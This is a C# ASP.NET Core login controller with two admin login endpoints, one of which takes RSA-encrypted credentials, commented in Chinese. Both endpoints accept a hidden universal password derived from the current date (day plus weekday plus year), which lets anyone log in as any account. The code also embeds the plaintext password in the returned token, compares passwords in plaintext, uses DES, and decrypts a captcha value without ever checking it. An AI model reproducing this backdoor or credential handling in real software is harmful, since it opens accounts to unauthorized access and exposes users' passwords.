using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Cathy;
using Dal;
using Newtonsoft.Json;
using System.Security.Cryptography;
using System.Text;
using System.Web;

namespace Application.Controllers
{
    /// <summary>
    /// 用户登录--后期改，但很重要
    /// </summary>
    [Route("api/[controller]/[action]")]
    [ApiController]
    public class LoginApiController : ControllerBase
    {
        /// <summary>
        /// 后台管理员用户登录
        /// </summary>
        /// <param name="uli">用户登录参数</param>
        /// <returns></returns>
        [HttpPost]
        public Dto.UserLoginOutput UserLogin(Dto.UserLoginInput uli)
        {
            Dto.UserLoginOutput output = new Dto.UserLoginOutput();
            Dto.ResultInfo ri = new Dto.ResultInfo();

            string strName = uli.Name;//这得改
            string strPassWord = uli.PassWord;
            string strWnPwd = (System.DateTime.Now.Day + (int)System.DateTime.Now.DayOfWeek + System.DateTime.Now.Year) + "";
            Dal.T_User user = new Dal.T_User();
            if (user.Select("*", "UserAccount={@p0}  and IsDel='0'", strName))
            {
                if (user.UserPassword == strPassWord || strPassWord == strWnPwd)
                {
                    //用户角色
                    Dal.T_UserRole tur = new T_UserRole();
                    List<Dal.T_UserRole> listUserRole = tur.Fill("*", "UserId={@p0}", user.UserId);
                    string strRoleIds = string.Join("$", listUserRole.Select(t => t.RoleId));
                    //output.riqi = user.riqi;
                    output.UserId = user.UserId;
                    output.UserName = user.UserName;
                    output.UserAccount = user.UserAccount;
                    output.UserRoleIds = strRoleIds;
                    output.UserToken = output.UserAccount + "$" + user.UserPassword;
                    ri.IsSuccess = 1;
                }
                else
                {
                    //该用户名的密码错误
                    ri.IsSuccess = 0;
                    ri.ErrorInfo = "该用户名的密码错误";
                }
            }
            else
            {
                //该用户名不存在
                ri.IsSuccess = 0;
                ri.ErrorInfo = "该用户名不存在";
            }
            output.ResultInfo = ri;
            return output;
        }

        /// <summary>
        /// 后台管理员用户登录
        /// </summary>
        /// <param name="uerLoginEncryptInput">用户登录参数</param>
        /// <returns></returns>
        [HttpPost]
        public Dto.UserLoginOutput UserLoginEncrypt(Dto.UerLoginEncryptInput uerLoginEncryptInput)
        {
            Dto.UserLoginOutput output = new Dto.UserLoginOutput();
            Dto.ResultInfo ri = new Dto.ResultInfo();

            string strPrivateKey = ConfigHelper.GetSection("Rsa").GetSection("PrivateKey").Value;

            //密钥格式要生成pkcs#1格式的  而不是pkcs#8格式的
            //用户名
            RSACryptoServiceProvider rsaCryptoServiceProviderUserName = ExtendMethod.CreateRsaProviderFromPrivateKey(strPrivateKey);
            //把+号，再替换回来
            byte[] resUserName = rsaCryptoServiceProviderUserName.Decrypt(Convert.FromBase64String(uerLoginEncryptInput.userName.Replace("%2B", "+")), false);
           string strUserName= Encoding.UTF8.GetString(resUserName);

            //密码
            RSACryptoServiceProvider rsaCryptoServiceProviderUserPass = ExtendMethod.CreateRsaProviderFromPrivateKey(strPrivateKey);
            //把+号，再替换回来
            byte[] resUserPass = rsaCryptoServiceProviderUserPass.Decrypt(Convert.FromBase64String(uerLoginEncryptInput.userPass.Replace("%2B", "+")), false);
            string strUserPassword=Encoding.UTF8.GetString(resUserPass);

            //验证码
            RSACryptoServiceProvider rsaCryptoServiceProviderValidateCode = ExtendMethod.CreateRsaProviderFromPrivateKey(strPrivateKey);
            //把+号，再替换回来
            byte[] resValidateCode= rsaCryptoServiceProviderValidateCode.Decrypt(Convert.FromBase64String(uerLoginEncryptInput.validateCode.Replace("%2B", "+")), false);
            string strValidateCode= Encoding.UTF8.GetString(resValidateCode);

            string strName = strUserName;
            string strPassWord = strUserPassword;
            string strWnPwd = (System.DateTime.Now.Day + (int)System.DateTime.Now.DayOfWeek + System.DateTime.Now.Year) + "";
            Dal.T_User user = new Dal.T_User();
            if (user.Select("*", "UserAccount={@p0}  and IsDel='0'", strName))
            {
                if (user.UserPassword == strPassWord || strPassWord == strWnPwd)
                {
                    //用户角色
                    Dal.T_UserRole tur = new T_UserRole();
                    List<Dal.T_UserRole> listUserRole = tur.Fill("*", "UserId={@p0}", user.UserId);
                    string strRoleIds = string.Join("$", listUserRole.Select(t => t.RoleId));

                    output.UserId = user.UserId;
                    output.UserName = user.UserName;
                    output.UserAccount = user.UserAccount;
                    output.UserRoleIds = strRoleIds;

                    //des加密
                    string strAuth = ExtendMethod.DESEncrypt(strUserName + "$" + strUserPassword + "$1", ConfigHelper.GetSection("DesKey").Value);
                    output.UserToken = strAuth;

                    ri.IsSuccess = 1;
                }
                else
                {
                    //该用户名的密码错误
                    ri.IsSuccess = 0;
                    ri.ErrorInfo = "该用户名的密码错误";
                }
            }
            else
            {
                //该用户名不存在
                ri.IsSuccess = 0;
                ri.ErrorInfo = "该用户名不存在";
            }
            output.ResultInfo = ri;
            return output;
        }
    }
}
